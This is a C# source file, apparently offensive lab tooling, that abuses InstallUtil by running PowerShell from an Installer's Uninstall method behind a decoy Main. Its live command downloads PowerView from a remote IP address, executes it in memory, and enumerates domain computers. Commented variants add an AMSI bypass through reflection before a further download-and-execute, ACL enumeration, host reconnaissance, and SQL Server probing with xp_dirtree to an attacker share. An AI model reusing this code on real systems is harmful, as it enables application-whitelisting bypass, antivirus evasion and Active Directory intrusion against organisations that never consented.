using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.IO;
using System.Data.SqlClient;

namespace InstallUtil
{
    class Program
    {
        static void Main(string[] args)
        {
            //UNUSED
            Console.WriteLine("This is the main method which is a decoy");
            
        }
    }

        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                

            
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

            String cmd = "(new-object system.net.webclient).downloadstring('http://192.168.45.153/PowerView.ps1') | iex;Get-DomainComputer | Out-File -FilePath C:\\Windows\\Tasks\\power.txt";

            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.165/PowerView.ps1') | IEX; Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*Generic*' } | Out-File -FilePath C:\\Windows\\Tasks\\generic.txt";

            //String cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \" * iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \" * Failed\") {$f=$e}};$f.SetValue($null,$true); (New-Object System.Net.WebClient).DownloadString('http://192.168.45.247/run.ps1') | IEX | Out-File -FilePath C:\\Windows\\Tasks\\debug.txt ";

            //String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.196/HostRecon.ps1') | IEX; Invoke-HostRecon | Out-File -FilePath C:\\Windows\\Tasks\\hostrecon.txt";

            //String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";

            /*  Run SQL commands within Runspace
             *  
             *  String sqlServer = "sql05.tricky.com";
              String database = "master";
              String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
              SqlConnection con = new SqlConnection(conString);
              //SqlCommand command = new SqlCommand();
              //SqlDataReader reader = command.ExecuteReader();

              String outfile = @"C:\\Windows\\Tasks\\sql.txt";
              String debugfile = @"C:\\Windows\\Tasks\\debug.txt";
              File.AppendAllText(debugfile, "Executed: " + DateTime.Now + Environment.NewLine);

              try
              {
                  con.Open();
                  Console.WriteLine("Auth success!");
                  Console.WriteLine("Connected to " + sqlServer);
                  File.AppendAllText(outfile, "Connected to " + sqlServer + Environment.NewLine);
              }
              catch
              {
                  Console.WriteLine("Auth failed");
                  File.AppendAllText(outfile, "Auth failed" + Environment.NewLine);
                  Environment.Exit(0);
              }


              String querylogin = "SELECT SYSTEM_USER;";
              SqlCommand command = new SqlCommand(querylogin, con);
              SqlDataReader reader = command.ExecuteReader();
              reader.Read();
              Console.WriteLine("Logged in as: " + reader[0]);
              reader.Close();

              String queryuser = "SELECT USER_NAME();";
              command = new SqlCommand(queryuser, con);
              reader = command.ExecuteReader();
              reader.Read();
              Console.WriteLine("Mapped to user: " + reader[0]);
              reader.Close();

              String dirtree = "EXEC master..xp_dirtree\"\\\\192.168.45.165\\\\test\";";
              command = new SqlCommand(dirtree, con);
              reader = command.ExecuteReader();
              reader.Close();*/

            //String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON " +
            //"a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'";
            //command = new SqlCommand(query, con);
            //reader = command.ExecuteReader();

            //reader.Read();
            //while (reader.Read() == true)
            //{
            //    Console.WriteLine("Logins that can be impersonated: " + reader[0] + Environment.NewLine);
            //    File.AppendAllText(outfile, "Impersonate: " + reader[0] + Environment.NewLine);
            //}

            //reader.Close();
            //con.Close();
            //String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            //command = new SqlCommand(querypublicrole, con);
            //reader = command.ExecuteReader();
            //reader.Read();
            //Int32 role = Int32.Parse(reader[0].ToString());
            //if (role == 1)
            //{
            //    Console.WriteLine("User is a member of public role");
            //}
            //else
            //{
            //    Console.WriteLine("User is NOT a member of public role");
            //}
            //reader.Close();

            //String queryadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            //command = new SqlCommand(queryadminrole, con);
            //reader = command.ExecuteReader();
            //reader.Read();
            //role = Int32.Parse(reader[0].ToString());
            //if (role == 1)
            //{
            //    Console.WriteLine("User is a member of sysadmin role");
            //}
            //else
            //{
            //    Console.WriteLine("User is NOT a member of sysadmin role");
            //}

            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
        }
    }
